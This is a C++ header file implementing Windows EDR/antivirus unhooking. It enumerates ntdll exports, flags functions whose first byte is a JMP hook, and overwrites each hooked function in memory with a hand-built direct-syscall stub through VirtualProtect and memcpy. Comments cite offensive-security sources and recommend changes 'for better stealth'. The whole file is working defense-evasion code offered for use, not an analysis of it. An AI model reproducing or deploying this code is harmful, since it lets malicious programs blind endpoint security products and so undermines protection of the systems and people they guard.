#pragma once

#include "Global.h"
#include <Windows.h>
#include <tlhelp32.h>
#include <winnt.h>
#include <list>
#include <string>


// From: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/patch_syscall_dynamically64.c
bool checkJmpHooked(char* name, DWORD* address, BOOL bNt) {
    BYTE* opcode = (BYTE*)address;

    // TODO: EDR/AV might bust this string array; for better stealth, take this out of your final program
    // if you know what to unhook beforehand.
    const char* falsePositives[] = {
        "NtGetTickCount",
        "NtQuerySystemTime",
        "NtdllDefWindowProc_A",
        "NtdllDefWindowProc_W",
        "NtdllDialogWndProc_A",
        "NtdllDialogWndProc_W",
        "ZwQuerySystemTime"
    };

    // Some EDRs hook more than Nt* API. Ex: LdrLoadDll 
    if (bNt) {
        if (!(name[0] == 'N' && name[1] == 't')) {
            return false;
        }
    }

    // not all EDRs hook the first byte you will miss some hook
    if (*opcode == 0xe9) { 
        // Handle a few false positives...
        // See: https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions
        for (int i = 0; i < (sizeof(falsePositives) / sizeof(const char*)); i++) {
            if (strcmp(name, falsePositives[i]) == 0)
                return false;
        }
        return true;
    }

    return false;
}



struct FunctionWithName {
    std::string name;
    DWORD64 startAddr = 0;
    int ordinal = 0;
    DWORD syscallId = 0;
};

std::list<FunctionWithName> getListOfExport(HMODULE libraryStartAddr) {

    std::list<FunctionWithName> lstFunctions = std::list<FunctionWithName>();

    IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)libraryStartAddr;
    IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)libraryStartAddr + MZ->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)libraryStartAddr + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addrOfNames = (DWORD*)((BYTE*)libraryStartAddr + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {

        // Creates a string from the function name.
        FunctionWithName functionWithName = FunctionWithName();
        functionWithName.name = std::string((CHAR*)libraryStartAddr + addrOfNames[i]);;
        functionWithName.startAddr = (DWORD64)GetProcAddress(libraryStartAddr, (char*)libraryStartAddr + addrOfNames[i]);
        functionWithName.ordinal = i + 9;

        // Gets the syscall ID.
        memcpy(&functionWithName.syscallId, (LPVOID)(functionWithName.startAddr + 4), 2);

        lstFunctions.push_back(functionWithName);
        PRINT_DEBUG("%p - [%d / %x]: %s\n", (void*)functionWithName.startAddr, functionWithName.ordinal, functionWithName.syscallId, functionWithName.name.c_str());
    }

    return lstFunctions;
}

std::list<FunctionWithName> getListOfHookedFunctions(std::list<FunctionWithName> funcList, bool checkOnlyNt = true) {

    std::list<FunctionWithName> lstHookedFunctions = std::list<FunctionWithName>();

    for (std::list<FunctionWithName>::iterator it = funcList.begin(); it != funcList.end(); ++it) {

        bool isHooked = checkJmpHooked((char*)it->name.c_str(), (DWORD*) it->startAddr, checkOnlyNt);

        //If the function is hooked, we push it to our array.
        if (isHooked) {
            lstHookedFunctions.push_back(*it);
            PRINT_DEBUG("%p: %s - is HOOKED.\n", (void*)it->startAddr, it->name.c_str());
        }
    }

    return lstHookedFunctions;
}

std::list<FunctionWithName> getListOfHookedFunctions(HMODULE libraryStartAddr, bool checkOnlyNt = true) {

    std::list<FunctionWithName> fnsWithName = getListOfExport(libraryStartAddr);
    std::list<FunctionWithName> lstHookedFunctions = getListOfHookedFunctions(fnsWithName, checkOnlyNt);

    return lstHookedFunctions;
}

void printByteString(char* strStart, int strLen) {
    for (int i = 0; i < strLen; i++) {
        printf("\\x%02hhx", strStart[i]);
    }
    printf("\n");
}

VOID patchHook(LPVOID address, int syscallId) {
    const DWORD dwSize = 11;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3

    CHAR patch[dwSize + 1];

    PRINT_DEBUG("Patching syscall ID: %d\n", syscallId);

    char high = syscallId >> 8;
    char id = syscallId;

    PRINT_DEBUG("High byte: ", high);
#ifdef DEBUG
    printByteString(&high, 1);
#endif

    PRINT_DEBUG("Low Byte: ", id);
#ifdef DEBUG
    printByteString(&id, 1);
#endif

    sprintf_s(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

#ifdef DEBUG

    CHAR originalSequence[dwSize + 1];
    memset(originalSequence, 0, dwSize + 1);
    memcpy_s(originalSequence, dwSize, address, dwSize);
    PRINT_DEBUG("Original byte sequence: ");
    printByteString(originalSequence, dwSize);

    PRINT_DEBUG("Applying patch: ");
    printByteString(patch, dwSize);

#endif

    DWORD dwOld;
    PRINT_DEBUG("Unprotecting memory...\n");
    VirtualProtect(address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    PRINT_DEBUG("Patching address %p...\n", address);
    memcpy_s(address, dwSize, patch, dwSize);
    PRINT_DEBUG("patched!...\n");
    VirtualProtect(address, dwSize, PAGE_EXECUTE_READ, &dwOld);
    PRINT_DEBUG("Reprotecting memory.  Patch applied!\n");
}

void unhookFunctions(std::list<FunctionWithName> lstFunctionsToUnhook) {
    for (std::list<FunctionWithName>::iterator it = lstFunctionsToUnhook.begin(); it != lstFunctionsToUnhook.end(); ++it) {
        patchHook((void*)it->startAddr, it->syscallId);
    }
}